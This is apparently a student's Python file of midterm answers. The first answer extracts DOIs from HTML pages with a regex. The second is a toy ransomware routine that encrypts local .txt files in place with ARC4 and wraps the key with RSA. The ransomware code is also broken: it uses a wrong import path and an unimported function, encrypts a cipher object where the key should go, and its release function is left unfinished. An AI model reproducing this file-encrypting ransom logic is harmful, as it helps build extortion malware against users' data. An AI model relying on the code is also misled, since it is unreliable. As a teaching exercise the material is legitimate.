# my solution for midterm problem 1:

import re

namelist = ['boyer', 'budoff', 'green', 'heber', 'horvath', 'osher', 'pearl', 'sayed', 'shapley', 'tao', 'wright']

for name in namelist:
	with open('/users/dhruv/desktop/pic16/midterm_p1_files/{}.html'.format(name), 'r') as reader:
		webpage = reader.read()

	doi = re.findall(r'(?:https://doi\.org/|doi:)([0-9a-zA-Z\./]+)[" <]', webpage)
	print doi

# my solution for midterm problem 2:

from Crypto.Cipher import ARC4
from Crypto import Random
from Crypto.Public_Key import RSA

filenames = ['1', '2', '3', '4', '5', '6', '7']

key_pair = RSA.generate(1024)
public_key = key_pair.publickey()

def ransomAttack(public_key, filenames):
	sym_key = get_random_bytes(64)
	encrypt_obj = ARC4.new(sym_key)
	decrpyt_obj = ARC4.new(sym_key)

	for name in filenames:
		with open('{}.txt'.format(name), 'r') as reader:
			data = reader.read()
		with open('{}.txt'.format(name), 'w') as writer:
			writer.write(encrypt_obj.encrypt(data).encode('hex'))

	return public_key.encrypt(decrpyt_obj, None)

        
def recoverKey(key_pair,cypherkey):
    return key_pair.decrypt(cypherkey)    

def ransomRelease(shared_key, filenames):
	for name in filenames:
		with open('{}.txt'.format(name), 'r') as reader:
			text = reader.read().decode('hex')

